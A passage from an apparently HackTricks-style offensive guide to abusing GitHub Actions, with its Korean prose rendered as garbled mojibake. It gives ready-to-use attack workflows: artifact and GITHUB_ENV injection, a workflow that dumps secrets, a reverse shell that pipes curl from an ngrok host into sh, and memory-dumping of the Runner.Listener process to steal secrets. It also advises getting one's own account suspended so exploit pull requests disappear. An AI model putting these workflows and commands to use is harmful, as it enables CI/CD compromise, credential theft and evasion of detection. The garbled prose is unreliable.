íŠ¹ì • [**GitHub ì»¨í…ìŠ¤íŠ¸**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context)ì˜ ê°’ì€ **PRì„ ìƒì„±í•˜ëŠ” ì‚¬ìš©ì**ì— ì˜í•´ **ì œì–´**ëœë‹¤ëŠ” ì ì— ìœ ì˜í•˜ì„¸ìš”. GitHub ì•¡ì…˜ì´ í•´ë‹¹ **ë°ì´í„°ë¥¼ ì‚¬ìš©í•˜ì—¬ ë¬´ì–¸ê°€ë¥¼ ì‹¤í–‰í•˜ëŠ” ê²½ìš°**, **ì„ì˜ ì½”ë“œ ì‹¤í–‰**ìœ¼ë¡œ ì´ì–´ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="gh-actions-context-script-injections.md" %}
[gh-actions-context-script-injections.md](gh-actions-context-script-injections.md)
{% endcontent-ref %}

### **GITHUB_ENV ìŠ¤í¬ë¦½íŠ¸ ì£¼ì…** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

ë¬¸ì„œì— ë”°ë¥´ë©´: í™˜ê²½ ë³€ìˆ˜ë¥¼ ì •ì˜í•˜ê±°ë‚˜ ì—…ë°ì´íŠ¸í•˜ê³  ì´ë¥¼ **`GITHUB_ENV`** í™˜ê²½ íŒŒì¼ì— ì‘ì„±í•˜ì—¬ ì›Œí¬í”Œë¡œìš° ì‘ì—…ì˜ ëª¨ë“  í›„ì† ë‹¨ê³„ì—ì„œ ì‚¬ìš©í•  ìˆ˜ ìˆë„ë¡ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ê³µê²©ìê°€ ì´ **env** ë³€ìˆ˜ ì•ˆì— **ì„ì˜ì˜ ê°’ì„ ì£¼ì…**í•  ìˆ˜ ìˆë‹¤ë©´, **LD_PRELOAD** ë˜ëŠ” **NODE_OPTIONS**ì™€ ê°™ì€ í›„ì† ë‹¨ê³„ì—ì„œ ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆëŠ” env ë³€ìˆ˜ë¥¼ ì£¼ì…í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì˜ˆë¥¼ ë“¤ì–´ ([**ì´ê²ƒ**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) ë° [**ì´ê²ƒ**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), ì—…ë¡œë“œëœ ì•„í‹°íŒ©íŠ¸ë¥¼ ì‹ ë¢°í•˜ì—¬ ê·¸ ë‚´ìš©ì„ **`GITHUB_ENV`** env ë³€ìˆ˜ì— ì €ì¥í•˜ëŠ” ì›Œí¬í”Œë¡œìš°ë¥¼ ìƒìƒí•´ ë³´ì„¸ìš”. ê³µê²©ìëŠ” ì´ë¥¼ ì†ìƒì‹œí‚¤ê¸° ìœ„í•´ ë‹¤ìŒê³¼ ê°™ì€ ê²ƒì„ ì—…ë¡œë“œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

<figure><img src="../../../.gitbook/assets/image (261).png" alt=""><figcaption></figcaption></figure>

### ì·¨ì•½í•œ ì„œë“œíŒŒí‹° GitHub ì•¡ì…˜

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

[**ì´ ë¸”ë¡œê·¸ ê²Œì‹œë¬¼**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks)ì—ì„œ ì–¸ê¸‰í–ˆë“¯ì´, ì´ GitHub ì•¡ì…˜ì€ ë‹¤ì–‘í•œ ì›Œí¬í”Œë¡œìš° ë° ì‹¬ì§€ì–´ ë¦¬í¬ì§€í† ë¦¬ì—ì„œ ì•„í‹°íŒ©íŠ¸ì— ì ‘ê·¼í•  ìˆ˜ ìˆë„ë¡ í•©ë‹ˆë‹¤.

ë¬¸ì œëŠ” **`path`** ë§¤ê°œë³€ìˆ˜ê°€ ì„¤ì •ë˜ì§€ ì•Šìœ¼ë©´ ì•„í‹°íŒ©íŠ¸ê°€ í˜„ì¬ ë””ë ‰í† ë¦¬ì— ì¶”ì¶œë˜ì–´ ë‚˜ì¤‘ì— ì‚¬ìš©ë˜ê±°ë‚˜ ì›Œí¬í”Œë¡œìš°ì—ì„œ ì‹¤í–‰ë  ìˆ˜ ìˆëŠ” íŒŒì¼ì„ ë®ì–´ì“¸ ìˆ˜ ìˆë‹¤ëŠ” ê²ƒì…ë‹ˆë‹¤. ë”°ë¼ì„œ ì•„í‹°íŒ©íŠ¸ê°€ ì·¨ì•½í•˜ë‹¤ë©´, ê³µê²©ìëŠ” ì´ë¥¼ ë‚¨ìš©í•˜ì—¬ ì•„í‹°íŒ©íŠ¸ë¥¼ ì‹ ë¢°í•˜ëŠ” ë‹¤ë¥¸ ì›Œí¬í”Œë¡œìš°ë¥¼ ì†ìƒì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì·¨ì•½í•œ ì›Œí¬í”Œë¡œìš°ì˜ ì˜ˆ:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
ì´ ì›Œí¬í”Œë¡œìš°ë¡œ ê³µê²©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
***

## ê¸°íƒ€ ì™¸ë¶€ ì ‘ê·¼

### ì‚­ì œëœ ë„¤ì„ìŠ¤í˜ì´ìŠ¤ ì €ì¥ì†Œ í•˜ì´ì¬í‚¹

ê³„ì • ì´ë¦„ì´ ë³€ê²½ë˜ë©´ ë‹¤ë¥¸ ì‚¬ìš©ìê°€ ì¼ì • ì‹œê°„ì´ ì§€ë‚œ í›„ í•´ë‹¹ ì´ë¦„ìœ¼ë¡œ ê³„ì •ì„ ë“±ë¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë§Œì•½ ì €ì¥ì†Œê°€ ì´ë¦„ ë³€ê²½ ì´ì „ì— **100ê°œ ë¯¸ë§Œì˜ ìŠ¤íƒ€**ë¥¼ ê°€ì¡Œë‹¤ë©´, GithubëŠ” ë™ì¼í•œ ì´ë¦„ì„ ê°€ì§„ ìƒˆë¡œìš´ ë“±ë¡ ì‚¬ìš©ìê°€ **ì‚­ì œëœ ê²ƒê³¼ ë™ì¼í•œ ì´ë¦„ì˜ ì €ì¥ì†Œ**ë¥¼ ìƒì„±í•˜ëŠ” ê²ƒì„ í—ˆìš©í•©ë‹ˆë‹¤.

{% hint style="danger" %}
ë”°ë¼ì„œ ì•¡ì…˜ì´ ì¡´ì¬í•˜ì§€ ì•ŠëŠ” ê³„ì •ì˜ ì €ì¥ì†Œë¥¼ ì‚¬ìš©í•˜ê³  ìˆë‹¤ë©´, ê³µê²©ìê°€ í•´ë‹¹ ê³„ì •ì„ ìƒì„±í•˜ê³  ì•¡ì…˜ì„ ì†ìƒì‹œí‚¬ ìˆ˜ ìˆëŠ” ê°€ëŠ¥ì„±ì´ ì—¬ì „íˆ ì¡´ì¬í•©ë‹ˆë‹¤.
{% endhint %}

ë‹¤ë¥¸ ì €ì¥ì†Œê°€ **ì´ ì‚¬ìš©ì ì €ì¥ì†Œì˜ ì˜ì¡´ì„±**ì„ ì‚¬ìš©í•˜ê³  ìˆë‹¤ë©´, ê³µê²©ìëŠ” ì´ë¥¼ í•˜ì´ì¬í‚¹í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì—¬ê¸°ì—ì„œ ë” ì™„ì „í•œ ì„¤ëª…ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

***

## ì €ì¥ì†Œ í”¼ë²—íŒ…

{% hint style="info" %}
ì´ ì„¹ì…˜ì—ì„œëŠ” ì²« ë²ˆì§¸ ì €ì¥ì†Œì— ì–´ë–¤ í˜•íƒœë¡œë“  ì ‘ê·¼í•  ìˆ˜ ìˆë‹¤ê³  ê°€ì •í•  ë•Œ **í•œ ì €ì¥ì†Œì—ì„œ ë‹¤ë¥¸ ì €ì¥ì†Œë¡œ í”¼ë²—í•  ìˆ˜ ìˆëŠ” ê¸°ìˆ **ì— ëŒ€í•´ ì´ì•¼ê¸°í•  ê²ƒì…ë‹ˆë‹¤ (ì´ì „ ì„¹ì…˜ì„ í™•ì¸í•˜ì„¸ìš”).
{% endhint %}

### ìºì‹œ ì˜¤ì—¼

ìºì‹œëŠ” **ë™ì¼í•œ ë¸Œëœì¹˜ì˜ ì›Œí¬í”Œë¡œìš° ì‹¤í–‰ ê°„ì— ìœ ì§€ë©ë‹ˆë‹¤**. ì¦‰, ê³µê²©ìê°€ **íŒ¨í‚¤ì§€**ë¥¼ **ì†ìƒì‹œí‚¤ê³ ** ì´ë¥¼ ìºì‹œì— ì €ì¥í•œ í›„ **ë” ë†’ì€ ê¶Œí•œì„ ê°€ì§„** ì›Œí¬í”Œë¡œìš°ì— ì˜í•´ **ë‹¤ìš´ë¡œë“œ** ë° ì‹¤í–‰ë˜ë©´, í•´ë‹¹ ì›Œí¬í”Œë¡œìš°ë„ **ì†ìƒì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

{% content-ref url="gh-actions-cache-poisoning.md" %}
[gh-actions-cache-poisoning.md](gh-actions-cache-poisoning.md)
{% endcontent-ref %}

### ì•„í‹°íŒ©íŠ¸ ì˜¤ì—¼

ì›Œí¬í”Œë¡œìš°ëŠ” **ë‹¤ë¥¸ ì›Œí¬í”Œë¡œìš° ë° ì €ì¥ì†Œì˜ ì•„í‹°íŒ©íŠ¸**ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê³µê²©ìê°€ **ì•„í‹°íŒ©íŠ¸ë¥¼ ì—…ë¡œë“œí•˜ëŠ”** Github Actionì„ **ì†ìƒì‹œí‚¤ë©´**, ë‚˜ì¤‘ì— ë‹¤ë¥¸ ì›Œí¬í”Œë¡œìš°ì—ì„œ ì‚¬ìš©ë˜ëŠ” ì•„í‹°íŒ©íŠ¸ë¥¼ í†µí•´ **ë‹¤ë¥¸ ì›Œí¬í”Œë¡œìš°ë¥¼ ì†ìƒì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤**:

{% content-ref url="gh-actions-artifact-poisoning.md" %}
[gh-actions-artifact-poisoning.md](gh-actions-artifact-poisoning.md)
{% endcontent-ref %}

***

## ì•¡ì…˜ì—ì„œì˜ í¬ìŠ¤íŠ¸ ìµìŠ¤í”Œë¡œì‡

### OIDCë¥¼ í†µí•œ AWS ë° GCP ì ‘ê·¼

ë‹¤ìŒ í˜ì´ì§€ë¥¼ í™•ì¸í•˜ì„¸ìš”:

{% content-ref url="../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### ë¹„ë°€ ì ‘ê·¼ <a href="#accessing-secrets" id="accessing-secrets"></a>

ìŠ¤í¬ë¦½íŠ¸ì— ë‚´ìš©ì„ ì£¼ì…í•˜ëŠ” ê²½ìš° ë¹„ë°€ì— ì ‘ê·¼í•˜ëŠ” ë°©ë²•ì„ ì•„ëŠ” ê²ƒì´ í¥ë¯¸ë¡­ìŠµë‹ˆë‹¤:

* ë¹„ë°€ ë˜ëŠ” í† í°ì´ **í™˜ê²½ ë³€ìˆ˜**ë¡œ ì„¤ì •ë˜ì–´ ìˆë‹¤ë©´, **`printenv`**ë¥¼ ì‚¬ìš©í•˜ì—¬ í™˜ê²½ì„ í†µí•´ ì§ì ‘ ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

<details>

<summary>Github Action ì¶œë ¥ì—ì„œ ë¹„ë°€ ëª©ë¡</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>ë¹„ë°€ì„ ì´ìš©í•œ ë¦¬ë²„ìŠ¤ ì…¸ ì–»ê¸°</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

* ë¹„ë°€ì´ **í‘œí˜„ì‹ì— ì§ì ‘ ì‚¬ìš©**ë˜ë©´, ìƒì„±ëœ ì…¸ ìŠ¤í¬ë¦½íŠ¸ê°€ **ë””ìŠ¤í¬ì— ì €ì¥**ë˜ê³  ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* ```bash
cat /home/runner/work/_temp/*
```
* JavaScript ì•¡ì…˜ì˜ ê²½ìš° ë¹„ë°€ì€ í™˜ê²½ ë³€ìˆ˜ë¥¼ í†µí•´ ì „ì†¡ë©ë‹ˆë‹¤.
* ```bash
ps axe | grep node
```
* **ì»¤ìŠ¤í…€ ì•¡ì…˜**ì˜ ê²½ìš°, í”„ë¡œê·¸ë¨ì´ **ì¸ìˆ˜**ì—ì„œ ì–»ì€ ë¹„ë°€ì„ ì‚¬ìš©í•˜ëŠ” ë°©ì‹ì— ë”°ë¼ ìœ„í—˜ì´ ë‹¬ë¼ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### ìì²´ í˜¸ìŠ¤íŒ… ëŸ¬ë„ˆ ì•…ìš©

**ë¹„Github ì¸í”„ë¼ì—ì„œ ì‹¤í–‰ë˜ê³  ìˆëŠ” Github Actions**ë¥¼ ì°¾ëŠ” ë°©ë²•ì€ Github Action êµ¬ì„± yamlì—ì„œ **`runs-on: self-hosted`**ë¥¼ ê²€ìƒ‰í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.

**ìì²´ í˜¸ìŠ¤íŒ…** ëŸ¬ë„ˆëŠ” **ì¶”ê°€ ë¯¼ê° ì •ë³´**ì— ì ‘ê·¼í•  ìˆ˜ ìˆìœ¼ë©°, ë‹¤ë¥¸ **ë„¤íŠ¸ì›Œí¬ ì‹œìŠ¤í…œ**(ë„¤íŠ¸ì›Œí¬ì˜ ì·¨ì•½í•œ ì—”ë“œí¬ì¸íŠ¸? ë©”íƒ€ë°ì´í„° ì„œë¹„ìŠ¤?)ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë˜ëŠ” ê²©ë¦¬ë˜ê³  íŒŒê´´ë˜ë”ë¼ë„ **ì—¬ëŸ¬ ì•¡ì…˜ì´ ë™ì‹œì— ì‹¤í–‰ë  ìˆ˜** ìˆìœ¼ë©°, ì•…ì˜ì ì¸ ì•¡ì…˜ì´ ë‹¤ë¥¸ ì•¡ì…˜ì˜ **ë¹„ë°€ì„ í›”ì¹  ìˆ˜** ìˆìŠµë‹ˆë‹¤.

ìì²´ í˜¸ìŠ¤íŒ… ëŸ¬ë„ˆì—ì„œëŠ” **\_Runner.Listener**\_\*\* í”„ë¡œì„¸ìŠ¤ì—ì„œ **ë¹„ë°€ì„ ì–»ëŠ” ê²ƒë„ ê°€ëŠ¥**í•˜ë©°, ì´ í”„ë¡œì„¸ìŠ¤ëŠ” ë©”ëª¨ë¦¬ë¥¼ ë¤í”„í•˜ì—¬ ëª¨ë“  ì›Œí¬í”Œë¡œì˜ ë¹„ë°€ì„ í¬í•¨í•©ë‹ˆë‹¤:

{% code overflow="wrap" %}
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
{% endcode %}

ìì„¸í•œ ë‚´ìš©ì€ [**ì´ ê²Œì‹œë¬¼ì„ í™•ì¸í•˜ì„¸ìš”**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/)ë¥¼ ì°¸ì¡°í•˜ì„¸ìš”.

### Github Docker ì´ë¯¸ì§€ ë ˆì§€ìŠ¤íŠ¸ë¦¬

Github ë‚´ë¶€ì— **Docker ì´ë¯¸ì§€ë¥¼ ë¹Œë“œí•˜ê³  ì €ì¥í•˜ëŠ” Github ì‘ì—…ì„ ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤**.\
ë‹¤ìŒ í™•ì¥ ê°€ëŠ¥í•œ ì˜ˆì œë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

<details>

<summary>Github Action ë¹Œë“œ &#x26; Docker ì´ë¯¸ì§€ í‘¸ì‹œ</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

ì´ì „ ì½”ë“œì—ì„œ ë³¼ ìˆ˜ ìˆë“¯ì´, Github ë ˆì§€ìŠ¤íŠ¸ë¦¬ëŠ” **`ghcr.io`**ì— í˜¸ìŠ¤íŒ…ë©ë‹ˆë‹¤.

ë ˆí¬ì— ëŒ€í•œ ì½ê¸° ê¶Œí•œì´ ìˆëŠ” ì‚¬ìš©ìëŠ” ê°œì¸ ì•¡ì„¸ìŠ¤ í† í°ì„ ì‚¬ìš©í•˜ì—¬ Docker ì´ë¯¸ì§€ë¥¼ ë‹¤ìš´ë¡œë“œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
ê·¸ëŸ° ë‹¤ìŒ ì‚¬ìš©ìëŠ” **Docker ì´ë¯¸ì§€ ë ˆì´ì–´ì—ì„œ ìœ ì¶œëœ ë¹„ë°€ì„ ê²€ìƒ‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:**

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics" %}

### Github Actions ë¡œê·¸ì˜ ë¯¼ê°í•œ ì •ë³´

**Github**ê°€ ì•¡ì…˜ ë¡œê·¸ì—ì„œ **ë¹„ë°€ ê°’ì„ ê°ì§€**í•˜ê³  **í‘œì‹œí•˜ì§€ ì•Šìœ¼ë ¤ê³ ** í•˜ë”ë¼ë„, ì•¡ì…˜ ì‹¤í–‰ ì¤‘ ìƒì„±ë  ìˆ˜ ìˆëŠ” **ë‹¤ë¥¸ ë¯¼ê°í•œ ë°ì´í„°**ëŠ” ìˆ¨ê²¨ì§€ì§€ ì•ŠìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, ë¹„ë°€ ê°’ìœ¼ë¡œ ì„œëª…ëœ JWTëŠ” [íŠ¹ë³„íˆ êµ¬ì„±ë˜ì§€ ì•ŠëŠ” í•œ](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret) ìˆ¨ê²¨ì§€ì§€ ì•ŠìŠµë‹ˆë‹¤.

## í”ì  ì§€ìš°ê¸°

(ê¸°ë²•ì€ [**ì—¬ê¸°**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)ì—ì„œ) ìš°ì„ , ìƒì„±ëœ ëª¨ë“  PRì€ Githubì—ì„œ ê³µê°œì ìœ¼ë¡œ ê·¸ë¦¬ê³  ëŒ€ìƒ GitHub ê³„ì •ì— ëª…í™•í•˜ê²Œ í‘œì‹œë©ë‹ˆë‹¤. GitHubì—ì„œëŠ” ê¸°ë³¸ì ìœ¼ë¡œ **ì¸í„°ë„·ì—ì„œ PRì„ ì‚­ì œí•  ìˆ˜ ì—†ìŠµë‹ˆë‹¤**, í•˜ì§€ë§Œ ë°˜ì „ì´ ìˆìŠµë‹ˆë‹¤. Githubì— ì˜í•´ **ì •ì§€ëœ** GitHub ê³„ì •ì˜ ê²½ìš°, ëª¨ë“  **PRì´ ìë™ìœ¼ë¡œ ì‚­ì œ**ë˜ê³  ì¸í„°ë„·ì—ì„œ ì œê±°ë©ë‹ˆë‹¤. ë”°ë¼ì„œ í™œë™ì„ ìˆ¨ê¸°ë ¤ë©´ **GitHub ê³„ì •ì„ ì •ì§€ì‹œí‚¤ê±°ë‚˜ ê³„ì •ì´ í”Œë˜ê·¸ê°€ ì§€ì •ë˜ë„ë¡ í•´ì•¼** í•©ë‹ˆë‹¤. ì´ë ‡ê²Œ í•˜ë©´ **ì¸í„°ë„·ì—ì„œ GitHubì˜ ëª¨ë“  í™œë™ì´ ìˆ¨ê²¨ì§‘ë‹ˆë‹¤** (ê¸°ë³¸ì ìœ¼ë¡œ ëª¨ë“  ìµìŠ¤í”Œë¡œì‡ PRì´ ì œê±°ë©ë‹ˆë‹¤).

GitHubì˜ ì¡°ì§ì€ ê³„ì •ì„ GitHubì— ë³´ê³ í•˜ëŠ” ë° ë§¤ìš° ì ê·¹ì ì…ë‹ˆë‹¤. ë‹¹ì‹ ì´ í•´ì•¼ í•  ì¼ì€ Issueì— â€œëª‡ ê°€ì§€ ìë£Œâ€ë¥¼ ê³µìœ í•˜ëŠ” ê²ƒì´ë©°, ê·¸ë“¤ì€ ë‹¹ì‹ ì˜ ê³„ì •ì´ 12ì‹œê°„ ì´ë‚´ì— ì •ì§€ë˜ë„ë¡ í•  ê²ƒì…ë‹ˆë‹¤ :p ê·¸ë ‡ê²Œ í•˜ë©´ GitHubì—ì„œ ë‹¹ì‹ ì˜ ìµìŠ¤í”Œë¡œì‡ì´ ë³´ì´ì§€ ì•Šê²Œ ë©ë‹ˆë‹¤.

{% hint style="warning" %}
ì¡°ì§ì´ ìì‹ ì´ í‘œì ì´ ë˜ì—ˆìŒì„ ì•Œì•„ë‚´ëŠ” ìœ ì¼í•œ ë°©ë²•ì€ SIEMì—ì„œ GitHub ë¡œê·¸ë¥¼ í™•ì¸í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤. GitHub UIì—ì„œëŠ” PRì´ ì œê±°ë˜ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.
{% endhint %}

## ë„êµ¬

ë‹¤ìŒ ë„êµ¬ëŠ” GitHub Action ì›Œí¬í”Œë¡œë¥¼ ì°¾ê³  ì·¨ì•½í•œ ê²ƒì„ ì°¾ëŠ” ë° ìœ ìš©í•©ë‹ˆë‹¤:

* [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
* [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **HackTricks**ì™€ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
{% endhint %}
